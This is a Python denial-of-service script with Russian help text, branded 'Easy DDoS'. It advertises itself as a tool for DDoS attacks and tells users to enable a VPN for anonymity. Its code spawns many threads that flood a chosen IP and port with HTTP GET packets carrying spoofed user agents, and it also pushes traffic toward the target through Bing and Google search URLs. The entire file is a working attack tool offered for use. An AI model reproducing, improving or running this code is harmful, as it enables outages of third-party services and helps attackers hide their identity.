import os
import sys
from queue import Queue
from optparse import OptionParser
import time,sys,socket,threading,logging,urllib.request,random

os.system('clear')
print("\033[36m",'''
  ______                  _____  _____   ____   _____ 
 |  ____|                |  __ \|  __ \ / __ \ / ____|
 | |__   __ _ ___ _   _  | |  | | |  | | |  | | (___  
 |  __| / _` / __| | | | | |  | | |  | | |  | |\___ \ 
 | |___| (_| \__ \ |_| | | |__| | |__| | |__| |____) |
 |______\__,_|___/\__, | |_____/|_____/ \____/|_____/ 
                   __/ |                              
                  |___/                                                                       
''')



def user_agent():
	global uagent
	uagent=[]
	uagent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
	uagent.append("Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0")
	uagent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
	uagent.append("Mozilla / 5.0(X11;Linux i686; rv:81.0) Gecko / 20100101 Firefox / 81.0")
	uagent.append("Mozilla / 5.0(Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxi686;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Ubuntu;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	uagent.append("Mozilla / 5.0(X11;Fedora;Linuxx86_64;rv:81.0) Gecko / 20100101Firefox / 81.0")
	return(uagent)

def my_bots():
	global bots
	bots=[]
	bots.append("http://www.bing.com/search?q=%40&count=50&first=0")
	bots.append("http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8")
	return(bots)

def my_bots2():
	global bots
	bots=[]
	bots.append("http://www.bing.com/search?q=%40&count=50&first=0")
	bots.append("http://www.google.com/search?hl=en&num=100&q=intext%3A%40&ie=utf-8")
	return(bots)

def bot_rippering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
			print("\033[95mБот включается...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)

def bot_again_rippering(url):
	try:
		while True:
			req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(uagent)}))
			print("\033[90Бот снова включается...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.2)

def down_it(item):
	try:
		while True:
			packet = str("GET / HTTP/1.1\nHost: "+host+"\n\n User-Agent: "+random.choice(uagent)+"\n"+data).encode('utf-8')
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[0m\033[32m-=-Пакет отправлен на сервер!-=-                           ","\033[90m",time.ctime(time.time()),"\033[0m")
			else:
				s.shutdown(1)
				print("\033[31m-=-Отключен-=-\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[31mНет соединения, возможно сервер лег!   ","\033[90m",time.ctime(time.time()),"\033[0m")
		#print("\033[91m",e,"\033[0m")
		time.sleep(.1)

def dos():
	while True:
		item = q.get()
		down_it(item)
		q.task_done()

def dos2():
	while True:
		item=w.get()
		bot_rippering(random.choice(bots)+"http://"+host)
		w.task_done()

#def dos3():
 #    while True:
 #       item = e.get()
 #       bot_rippering(random.choice(bots)+"http://"+host)
 #       e.task_done()

def usage():
	print (''' \033[0;95mDDoSuS
	Добро пожаловать в утилиту для проведения DDoS атак!
	Включите VPN, чтобы быть анонимным. Ваш IP будет виден, если вы не его не включите. \n
	Использование: python3 st.py [-s] [-p] [-t] [-q]
	-h - помощь
	-s - IP адресс сервера
	-p - порт (по умолчанию 80)
	-q - скрытность
	-t - количество потоков (для мобильных устройств советуеться 100-500 (100500+), для компьютеров - 500-1000+)\033[0m ''')

	sys.exit()

def get_parameters():
	global host
	global port
	global thr
	global item
	optp = OptionParser(add_help_option=False,epilog="Rippers")
	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 or 443 -t 135 or 443")
	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
	optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
	opts, args = optp.parse_args()
	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
	if opts.help:
		usage()
	if opts.host is not None:
		host = opts.host
	else:
		usage()
	if opts.port is None:
		port = 80
	else:
		port = opts.port
	if opts.turbo is None:
		thr = 135
	else:
		thr = opts.turbo

# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

#task queue are q,w,e
q = Queue()
w = Queue()
e = Queue()

if __name__ == '__main__':
	if len(sys.argv) < 2:
		usage()
	get_parameters()
	print("\033[35m","      IP: ",host," порт: ",str(port)," потоков: ",str(thr),"\033[0m")
	print("\033[94mПожалуйста, подождите...\033[0m")
	user_agent()
	my_bots()
	time.sleep(5)
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((host,int(port)))
		s.settimeout(1)
	except socket.error as e:
		print("\033[91Проверьте сервер, айпи и порт.\033[0m")
		usage()
	while True:
		for i in range(int(thr)):
			t = threading.Thread(target=dos)
			t.daemon = True  # if thread is exist, it dies
			t.start()
			t2 = threading.Thread(target=dos2)
			t2.daemon = True  # if thread is exist, it dies
			t2.start()
		#	t3 = threading/Thread(target=dos3)
		#	t3.daemon = True # if thread is exist, it dies
		#	t3.start()
		start = time.time()
		#tasking
		item = 0
		while True:
			if (item>1800): # for no memory crash
				item=0
				time.sleep(.1)
			item = item + 1
			q.put(item)
			w.put(item)
			e.put(item)
		q.join()
	w.join()
e.join()
